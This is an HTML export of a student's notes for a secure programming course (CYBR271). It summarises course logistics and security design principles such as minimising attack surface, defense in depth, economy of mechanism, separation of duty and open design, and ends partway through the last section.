<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Secure Programming CYBR271</title><style>
/* cspell:disable-file */
/* webkit printing magic: print all background colors */
html {
	-webkit-print-color-adjust: exact;
}
* {
	box-sizing: border-box;
	-webkit-print-color-adjust: exact;
}

html,
body {
	margin: 0;
	padding: 0;
}
@media only screen {
	body {
		margin: 2em auto;
		max-width: 900px;
		color: rgb(55, 53, 47);
	}
}

body {
	line-height: 1.5;
	white-space: pre-wrap;
}

a,
a.visited {
	color: inherit;
	text-decoration: underline;
}

.pdf-relative-link-path {
	font-size: 80%;
	color: #444;
}

h1,
h2,
h3 {
	letter-spacing: -0.01em;
	line-height: 1.2;
	font-weight: 600;
	margin-bottom: 0;
}

.page-title {
	font-size: 2.5rem;
	font-weight: 700;
	margin-top: 0;
	margin-bottom: 0.75em;
}

h1 {
	font-size: 1.875rem;
	margin-top: 1.875rem;
}

h2 {
	font-size: 1.5rem;
	margin-top: 1.5rem;
}

h3 {
	font-size: 1.25rem;
	margin-top: 1.25rem;
}

.source {
	border: 1px solid #ddd;
	border-radius: 3px;
	padding: 1.5em;
	word-break: break-all;
}

.callout {
	border-radius: 3px;
	padding: 1rem;
}

figure {
	margin: 1.25em 0;
	page-break-inside: avoid;
}

figcaption {
	opacity: 0.5;
	font-size: 85%;
	margin-top: 0.5em;
}

mark {
	background-color: transparent;
}

.indented {
	padding-left: 1.5em;
}

hr {
	background: transparent;
	display: block;
	width: 100%;
	height: 1px;
	visibility: visible;
	border: none;
	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
}

img {
	max-width: 100%;
}

@media only print {
	img {
		max-height: 100vh;
		object-fit: contain;
	}
}

@page {
	margin: 1in;
}

.collection-content {
	font-size: 0.875rem;
}

.column-list {
	display: flex;
	justify-content: space-between;
}

.column {
	padding: 0 1em;
}

.column:first-child {
	padding-left: 0;
}

.column:last-child {
	padding-right: 0;
}

.table_of_contents-item {
	display: block;
	font-size: 0.875rem;
	line-height: 1.3;
	padding: 0.125rem;
}

.table_of_contents-indent-1 {
	margin-left: 1.5rem;
}

.table_of_contents-indent-2 {
	margin-left: 3rem;
}

.table_of_contents-indent-3 {
	margin-left: 4.5rem;
}

.table_of_contents-link {
	text-decoration: none;
	opacity: 0.7;
	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
}

table,
th,
td {
	border: 1px solid rgba(55, 53, 47, 0.09);
	border-collapse: collapse;
}

table {
	border-left: none;
	border-right: none;
}

th,
td {
	font-weight: normal;
	padding: 0.25em 0.5em;
	line-height: 1.5;
	min-height: 1.5em;
	text-align: left;
}

th {
	color: rgba(55, 53, 47, 0.6);
}

ol,
ul {
	margin: 0;
	margin-block-start: 0.6em;
	margin-block-end: 0.6em;
}

li > ol:first-child,
li > ul:first-child {
	margin-block-start: 0.6em;
}

ul > li {
	list-style: disc;
}

ul.to-do-list {
	padding-inline-start: 0;
}

ul.to-do-list > li {
	list-style: none;
}

.to-do-children-checked {
	text-decoration: line-through;
	opacity: 0.375;
}

ul.toggle > li {
	list-style: none;
}

ul {
	padding-inline-start: 1.7em;
}

ul > li {
	padding-left: 0.1em;
}

ol {
	padding-inline-start: 1.6em;
}

ol > li {
	padding-left: 0.2em;
}

.mono ol {
	padding-inline-start: 2em;
}

.mono ol > li {
	text-indent: -0.4em;
}

.toggle {
	padding-inline-start: 0em;
	list-style-type: none;
}

/* Indent toggle children */
.toggle > li > details {
	padding-left: 1.7em;
}

.toggle > li > details > summary {
	margin-left: -1.1em;
}

.selected-value {
	display: inline-block;
	padding: 0 0.5em;
	background: rgba(206, 205, 202, 0.5);
	border-radius: 3px;
	margin-right: 0.5em;
	margin-top: 0.3em;
	margin-bottom: 0.3em;
	white-space: nowrap;
}

.collection-title {
	display: inline-block;
	margin-right: 1em;
}

.page-description {
    margin-bottom: 2em;
}

.simple-table {
	margin-top: 1em;
	font-size: 0.875rem;
	empty-cells: show;
}
.simple-table td {
	height: 29px;
	min-width: 120px;
}

.simple-table th {
	height: 29px;
	min-width: 120px;
}

.simple-table-header-color {
	background: rgb(247, 246, 243);
	color: black;
}
.simple-table-header {
	font-weight: 500;
}

time {
	opacity: 0.5;
}

.icon {
	display: inline-block;
	max-width: 1.2em;
	max-height: 1.2em;
	text-decoration: none;
	vertical-align: text-bottom;
	margin-right: 0.5em;
}

img.icon {
	border-radius: 3px;
}

.user-icon {
	width: 1.5em;
	height: 1.5em;
	border-radius: 100%;
	margin-right: 0.5rem;
}

.user-icon-inner {
	font-size: 0.8em;
}

.text-icon {
	border: 1px solid #000;
	text-align: center;
}

.page-cover-image {
	display: block;
	object-fit: cover;
	width: 100%;
	max-height: 30vh;
}

.page-header-icon {
	font-size: 3rem;
	margin-bottom: 1rem;
}

.page-header-icon-with-cover {
	margin-top: -0.72em;
	margin-left: 0.07em;
}

.page-header-icon img {
	border-radius: 3px;
}

.link-to-page {
	margin: 1em 0;
	padding: 0;
	border: none;
	font-weight: 500;
}

p > .user {
	opacity: 0.5;
}

td > .user,
td > time {
	white-space: nowrap;
}

input[type="checkbox"] {
	transform: scale(1.5);
	margin-right: 0.6em;
	vertical-align: middle;
}

p {
	margin-top: 0.5em;
	margin-bottom: 0.5em;
}

.image {
	border: none;
	margin: 1.5em 0;
	padding: 0;
	border-radius: 0;
	text-align: center;
}

.code,
code {
	background: rgba(135, 131, 120, 0.15);
	border-radius: 3px;
	padding: 0.2em 0.4em;
	border-radius: 3px;
	font-size: 85%;
	tab-size: 2;
}

code {
	color: #eb5757;
}

.code {
	padding: 1.5em 1em;
}

.code-wrap {
	white-space: pre-wrap;
	word-break: break-all;
}

.code > code {
	background: none;
	padding: 0;
	font-size: 100%;
	color: inherit;
}

blockquote {
	font-size: 1.25em;
	margin: 1em 0;
	padding-left: 1em;
	border-left: 3px solid rgb(55, 53, 47);
}

.bookmark {
	text-decoration: none;
	max-height: 8em;
	padding: 0;
	display: flex;
	width: 100%;
	align-items: stretch;
}

.bookmark-title {
	font-size: 0.85em;
	overflow: hidden;
	text-overflow: ellipsis;
	height: 1.75em;
	white-space: nowrap;
}

.bookmark-text {
	display: flex;
	flex-direction: column;
}

.bookmark-info {
	flex: 4 1 180px;
	padding: 12px 14px 14px;
	display: flex;
	flex-direction: column;
	justify-content: space-between;
}

.bookmark-image {
	width: 33%;
	flex: 1 1 180px;
	display: block;
	position: relative;
	object-fit: cover;
	border-radius: 1px;
}

.bookmark-description {
	color: rgba(55, 53, 47, 0.6);
	font-size: 0.75em;
	overflow: hidden;
	max-height: 4.5em;
	word-break: break-word;
}

.bookmark-href {
	font-size: 0.75em;
	margin-top: 0.25em;
}

.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
.highlight-default {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.highlight-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.highlight-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.highlight-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.highlight-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.highlight-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.highlight-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.highlight-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.highlight-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.highlight-default_background {
	color: rgba(55, 53, 47, 1);
}
.highlight-gray_background {
	background: rgba(241, 241, 239, 1);
}
.highlight-brown_background {
	background: rgba(244, 238, 238, 1);
}
.highlight-orange_background {
	background: rgba(251, 236, 221, 1);
}
.highlight-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.highlight-teal_background {
	background: rgba(237, 243, 236, 1);
}
.highlight-blue_background {
	background: rgba(231, 243, 248, 1);
}
.highlight-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.highlight-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.highlight-red_background {
	background: rgba(253, 235, 236, 1);
}
.block-color-default {
	color: inherit;
	fill: inherit;
}
.block-color-gray {
	color: rgba(120, 119, 116, 1);
	fill: rgba(120, 119, 116, 1);
}
.block-color-brown {
	color: rgba(159, 107, 83, 1);
	fill: rgba(159, 107, 83, 1);
}
.block-color-orange {
	color: rgba(217, 115, 13, 1);
	fill: rgba(217, 115, 13, 1);
}
.block-color-yellow {
	color: rgba(203, 145, 47, 1);
	fill: rgba(203, 145, 47, 1);
}
.block-color-teal {
	color: rgba(68, 131, 97, 1);
	fill: rgba(68, 131, 97, 1);
}
.block-color-blue {
	color: rgba(51, 126, 169, 1);
	fill: rgba(51, 126, 169, 1);
}
.block-color-purple {
	color: rgba(144, 101, 176, 1);
	fill: rgba(144, 101, 176, 1);
}
.block-color-pink {
	color: rgba(193, 76, 138, 1);
	fill: rgba(193, 76, 138, 1);
}
.block-color-red {
	color: rgba(212, 76, 71, 1);
	fill: rgba(212, 76, 71, 1);
}
.block-color-default_background {
	color: inherit;
	fill: inherit;
}
.block-color-gray_background {
	background: rgba(241, 241, 239, 1);
}
.block-color-brown_background {
	background: rgba(244, 238, 238, 1);
}
.block-color-orange_background {
	background: rgba(251, 236, 221, 1);
}
.block-color-yellow_background {
	background: rgba(251, 243, 219, 1);
}
.block-color-teal_background {
	background: rgba(237, 243, 236, 1);
}
.block-color-blue_background {
	background: rgba(231, 243, 248, 1);
}
.block-color-purple_background {
	background: rgba(244, 240, 247, 0.8);
}
.block-color-pink_background {
	background: rgba(249, 238, 243, 0.8);
}
.block-color-red_background {
	background: rgba(253, 235, 236, 1);
}
.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
.select-value-color-pageGlass { background-color: undefined; }
.select-value-color-washGlass { background-color: undefined; }

.checkbox {
	display: inline-flex;
	vertical-align: text-bottom;
	width: 16;
	height: 16;
	background-size: 16px;
	margin-left: 2px;
	margin-right: 5px;
}

.checkbox-on {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
}

.checkbox-off {
	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
}
	
</style></head><body><article id="7de66dc1-0084-4e6f-bd52-52b3927fd92d" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🔒</span></div><h1 class="page-title"><strong>Secure Programming </strong>CYBR271</h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesCreatedAt"><path d="M8 15.126C11.8623 15.126 15.0615 11.9336 15.0615 8.06445C15.0615 4.20215 11.8623 1.00293 7.99316 1.00293C4.13086 1.00293 0.938477 4.20215 0.938477 8.06445C0.938477 11.9336 4.1377 15.126 8 15.126ZM8 13.7383C4.85547 13.7383 2.33301 11.209 2.33301 8.06445C2.33301 4.91992 4.84863 2.39746 7.99316 2.39746C11.1377 2.39746 13.6738 4.91992 13.6738 8.06445C13.6738 11.209 11.1445 13.7383 8 13.7383ZM4.54102 8.91211H7.99316C8.30078 8.91211 8.54004 8.67285 8.54004 8.37207V3.8877C8.54004 3.58691 8.30078 3.34766 7.99316 3.34766C7.69238 3.34766 7.45312 3.58691 7.45312 3.8877V7.83203H4.54102C4.2334 7.83203 4.00098 8.06445 4.00098 8.37207C4.00098 8.67285 4.2334 8.91211 4.54102 8.91211Z"></path></svg></span>Created time</th><td><time>@July 9, 2024 1:12 PM</time></td></tr></tbody></table></header><div class="page-body"><ul id="e1cc3ccb-4894-4041-ad16-9f1569c39a68" class="toggle"><li><details><summary>Part 1</summary><ul id="ccc4f38d-18a4-4145-9d40-e52aceae699e" class="toggle"><li><details><summary>Introduction</summary><p id="a611a8d5-7765-47c9-9d65-4050bd87a287" class="">what is the course about</p><ul id="87b88196-26c3-47f3-b7d1-270df8d6fec3" class="bulleted-list"><li style="list-style-type:disc">stack buffer overflow attack</li></ul><ul id="07c9fee6-8e8e-4f2b-83bf-f1296a87d298" class="bulleted-list"><li style="list-style-type:disc">web server written in c</li></ul><ul id="b277ce94-4b45-4187-8afc-964754dba842" class="bulleted-list"><li style="list-style-type:disc">allowed remote code execution </li></ul><p id="306b8466-085d-40dd-8806-6abf3ee99889" class="">work</p><ul id="5035d0a7-0c94-4a21-87bb-a9f6ced736e4" class="bulleted-list"><li style="list-style-type:disc">2 25% assignments for 3 weeks</li></ul><ul id="7bd41c11-d400-4dde-87a1-09bad0145a1b" class="bulleted-list"><li style="list-style-type:disc">1 2 week assignment for 15%</li></ul><ul id="bb72766b-26ce-4b9f-9dfd-84b60815d005" class="bulleted-list"><li style="list-style-type:disc">1 2 hour test for 35%</li></ul><ul id="d9a11233-3abd-4047-86bd-20d298eb2e4a" class="bulleted-list"><li style="list-style-type:disc">2 lectures + 1 tut per week at the end</li></ul><ul id="8fd02851-9321-4d2d-8a36-56a4516ec584" class="bulleted-list"><li style="list-style-type:disc"></li></ul></details></li></ul><ul id="fdfe2850-505d-4eca-8c3c-bf4646d06aa3" class="toggle"><li><details><summary>Security Principles</summary><ul id="2c79cc03-1bc7-4eea-864b-9dd9d20b0edd" class="toggle"><li><details><summary>Minimize the attack surface Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="2a73e8bb-ca08-43d9-98b3-ce0a9528c9b1"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">attack surface are <mark class="highlight-yellow">all the different points where an attacker could get into</mark> a system and where they can get data out<ul id="5041cfb1-eff7-444c-819c-446e426c1680" class="bulleted-list"><li style="list-style-type:disc">smaller attacker surface are harder to attack</li></ul><ul id="274153f5-9346-44bd-b546-8622f68858a8" class="bulleted-list"><li style="list-style-type:disc">allows comparison of relative vulnerability</li></ul><ul id="a116d2dd-8815-4085-afb1-a444913a49ab" class="bulleted-list"><li style="list-style-type:disc">effect of changes to a system after adding a new feature tends thew system to become less secure over time</li></ul></div></figure><h3 id="26a2a77c-9bff-4656-8e13-394dde7feddb" class="">Attack surface example</h3><p id="c4909f0a-6421-4f8f-8bef-f583d1e7f863" class="">shopping mall is larger and has more entrances and exists, making it a larger attack surface and easier to defend</p><p id="3379ddd0-03e2-4022-a33f-606498946b04" class="">tower house has less points making it have a smaller attack surface</p><figure id="be552dbc-515e-412a-99e7-fc8ae5d7026c" class="image"><a href="Untitled.png"><img style="width:2161px" src="Untitled.png"/></a></figure><h3 id="7ff449fc-8d86-4fca-83c5-16b301053440" class="">Software Attack Surface</h3><p id="2825295e-3896-4c40-b70a-bb7f82295c5a" class="">attack surface for an application are</p><ol type="1" id="6abba1c0-3b2f-4677-9ba6-46c6ab890e0c" class="numbered-list" start="1"><li>sum of all paths for data in and out of the application</li></ol><ol type="1" id="a9b46640-1933-4e09-936e-4ce68f9c52f0" class="numbered-list" start="2"><li>code that protects these paths (auth, validation, logging, resource connection)</li></ol><ol type="1" id="cdc8ac46-9e39-4e7b-bf0c-034bb71d8ab7" class="numbered-list" start="3"><li>valuable data used in the application (keys, IP, critical business data, personal data, secretes)</li></ol><ol type="1" id="d8ea3290-3731-4678-947b-f14f7197a7fc" class="numbered-list" start="4"><li>code that protects valuable data (encryption, checksums, access auditing, data integrity and operational security controls)</li></ol></details></li></ul><ul id="80701c7b-dd72-4cfe-a3ac-03b8483f3839" class="toggle"><li><details><summary>Defense in Depth Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="a8ceb530-7437-4f58-8c42-83ef0d75c4f3"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">use <mark class="highlight-yellow">multiple layered security defenses</mark><p id="8344d3fd-aeca-4756-a58d-761fc847a7c3" class="">there are many ways to define your application</p><ul id="a6d1583a-4d9c-4613-b674-e7566c906d18" class="bulleted-list"><li style="list-style-type:disc">if a defense fails, then you want another layer of defense</li></ul><ul id="10295a6c-1cd7-484c-bf21-c45a37c3c632" class="bulleted-list"><li style="list-style-type:disc">a defense may fail if <ul id="a9ccce95-9239-4311-85b1-8b188499ce1f" class="bulleted-list"><li style="list-style-type:circle">You make any kind of an error</li></ul><ul id="d562f0b1-cf46-489b-9bef-3be40b0fe830" class="bulleted-list"><li style="list-style-type:circle">Someone else is negligent or malicious </li></ul><ul id="deaf5e75-41d6-4c95-840c-3988b725cfde" class="bulleted-list"><li style="list-style-type:circle">Circumstances change</li></ul><ul id="a44e4d21-672e-4402-b2ce-a7eeb3204f58" class="bulleted-list"><li style="list-style-type:circle">New attack methods are developed</li></ul></li></ul></div></figure><h3 id="15e4d764-036d-40d2-b90f-d7caa0039c98" class="">Problems with DID</h3><ul id="99bd96a7-338f-4c34-8159-20dbb35f1031" class="bulleted-list"><li style="list-style-type:disc">timelines and laziness can lead to developers to ignore defense in depth</li></ul><ul id="a837474b-e6cb-4b1c-b10d-abd4c5dc3700" class="bulleted-list"><li style="list-style-type:disc">security is hard to get right</li></ul><ul id="31674746-95ae-407e-9d63-eeb6fbefac6a" class="bulleted-list"><li style="list-style-type:disc">changing conditions can result in expensive patches to restore a secure situation</li></ul><ul id="8aa1ea9d-c0dc-4fba-a23a-d6ddcd45f4b0" class="bulleted-list"><li style="list-style-type:disc">negligence is responsible for up to a third of exploits</li></ul><p id="24ac42c7-6aa9-4943-9c24-2c1b740d897a" class="">
</p></details></li></ul><ul id="bcc8904b-0ee3-4243-897c-4d39452635a4" class="toggle"><li><details><summary>Don’t Reinvent the Wheel Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="ed0378f2-2616-44fb-907b-4f2ca41ffbb6"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">security is hard, so don’t implement your own security, use other people’s code/libraries which already work<ul id="923e1837-313e-4261-a530-55c9c488bd75" class="bulleted-list"><li style="list-style-type:disc">Some of it has been written by smart people</li></ul><ul id="9b9734fe-e1d3-4d06-9bfc-74fe8d99bf66" class="bulleted-list"><li style="list-style-type:disc">Some of it has been thoroughly vetted</li></ul><ul id="032d9aea-6012-4c38-807b-35e951baddb0" class="bulleted-list"><li style="list-style-type:disc">Some of it is known to be secure or more secure than untested code you might write yourself</li></ul><ul id="fc3519ad-b6b7-4336-b489-c2e4aad05594" class="bulleted-list"><li style="list-style-type:disc">Check the Common Vulnerability Database</li></ul></div></figure><h3 id="7c20b598-1198-4bf5-927b-ace77481ba74" class="">Examples</h3><ul id="557046d2-8ece-4ee4-8f68-89183ffbba56" class="bulleted-list"><li style="list-style-type:disc">Cryptography is difficult to implement well<ul id="e6de640e-6ce7-44ef-a5a7-28be0fc9a34d" class="bulleted-list"><li style="list-style-type:circle">Can you trust your own algorithm?</li></ul><ul id="f7a1780a-7c5a-4e46-aee1-22cba3701581" class="bulleted-list"><li style="list-style-type:circle">Can you trust yourself to implement an existing algorithm correctly?</li></ul><ul id="581b68b0-b121-429e-a62f-9625982d7623" class="bulleted-list"><li style="list-style-type:circle">What is worth your time, finding a well-regarded cryptographic library or writing your own insecure one?</li></ul></li></ul><ul id="796dd5fd-fd93-49b4-9635-49b9c28b019f" class="bulleted-list"><li style="list-style-type:disc">Web application frameworks simplify development.<ul id="3a2e16f9-f6be-4c55-9796-7f4c70f805ce" class="bulleted-list"><li style="list-style-type:circle">Do you have time to implement security features?</li></ul><ul id="0d10ab42-2aa8-4f5e-8fb6-efe686626ad1" class="bulleted-list"><li style="list-style-type:circle">Is it better to use a framework that is mature and has had effort put into making it secure than writing your own insecure one?</li></ul><ul id="94883b94-7d50-49a2-ba12-9add93f15403" class="bulleted-list"><li style="list-style-type:circle">Input validation, SQL injection avoidance, XSS avoidance, CSRF protection</li></ul></li></ul><p id="a2be2d57-7995-410f-be78-21502f3e8962" class="">
</p><p id="6784c050-d396-4cd5-a74b-364ad00a09e3" class="">
</p></details></li></ul><ul id="9374dab1-5728-4ee3-a57d-d7cc4c7d6e99" class="toggle"><li><details><summary>Economy of Mechanism Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="f1b46796-92f2-4c60-bfbc-63b61b57b1b8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">related to attack surface, we should keep <mark class="highlight-yellow">security mechanisms should be as simple as possible</mark><ul id="d86c7a6a-4f54-40ed-9532-bef6e926e295" class="bulleted-list"><li style="list-style-type:disc">complex code is harder to understand, test, fix</li></ul></div></figure><figure id="0f587a79-b876-4d13-8644-9448cd5e9238" class="image"><a href="Untitled%201.png"><img style="width:623.96875px" src="Untitled%201.png"/></a></figure></details></li></ul><ul id="3529478e-ab75-4a1d-98d1-3f49e8df619d" class="toggle"><li><details><summary>Separation of Duty Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="f383ea97-70a4-4461-954a-33bf42d20517"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">privileges should not be granted based on a single condition<ul id="ed69b418-34fa-4bbf-a0b8-ec9f6576bd9e" class="bulleted-list"><li style="list-style-type:disc">require multiple components to agree before access can be granted to a resource</li></ul><ul id="27818d34-7d73-4c2a-b141-af344051dfe0" class="bulleted-list"><li style="list-style-type:disc">eg: need two signatures in order for a bank to make a payment</li></ul><ul id="03c89116-7c95-4cdb-a8be-3d901cf33d5d" class="bulleted-list"><li style="list-style-type:disc">this prevents the breach of one component leading to the breach of others and minimizes the effect of a security breach</li></ul></div></figure><h3 id="89b0a874-9953-4042-a7eb-f4f3819a6080" class="">Example</h3><ul id="853f1263-10ee-4605-b6b4-c1d173ebcffe" class="bulleted-list"><li style="list-style-type:disc">Two factor authentication<p id="2a2bd8f1-fd55-474e-aff5-7273b8dd9d67" class="">attacker has to get hold of both a secret and token</p></li></ul><ul id="5029d07e-67d8-4ef0-ace9-1d9e8fcbbd2c" class="bulleted-list"><li style="list-style-type:disc">Accounting systems.<p id="97aa0d6c-ecb3-40c0-8f7c-ff8df8310647" class="">one person can receive an invoice, another person makes the payment</p></li></ul></details></li></ul><ul id="f930d833-f50c-4a3d-b64d-74c4b8562ded" class="toggle"><li><details><summary>Open design Principle</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="ce8d2234-20e7-4d74-999a-fb3954433a74"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">security of a system should not depend on the secrecy of the design/implementation <ul id="fee9a247-5043-4852-b1c8-f703644bb971" class="bulleted-list"><li style="list-style-type:disc">open designs allow other people to test and improve it<ul id="6251c310-624a-4720-9296-46e0ebb2742a" class="bulleted-list"><li style="list-style-type:circle">the more reviews and testing, the more secure it is</li></ul></li></ul><ul id="1cd05e71-d1aa-4864-bd70-bab393d1ae14" class="bulleted-list"><li style="list-style-type:disc">if its not open then you don’t know when an attacker has vulnerabilities on your system </li></ul><ul id="19d00e3c-c1b2-475b-8bb8-352f2565ee6f" class="bulleted-list"><li style="list-style-type:disc">avoid Security by Obscurity</li></ul><ul id="ad09e230-d363-4eec-b7bb-7e7a8cea8d56" class="bulleted-list"><li style="list-style-type:disc">highly unlikely that any algorithm/method can be kept secret</li></ul><ul id="cdaa6621-08d0-44e7-ab6a-5ffc6f350fbc" class="bulleted-list"><li style="list-style-type:disc">openness applies to algorithms and implementation but not the data (eg: encryption keys)</li></ul></div></figure><p id="40460113-b56b-4496-8094-67eccf05f061" class="">
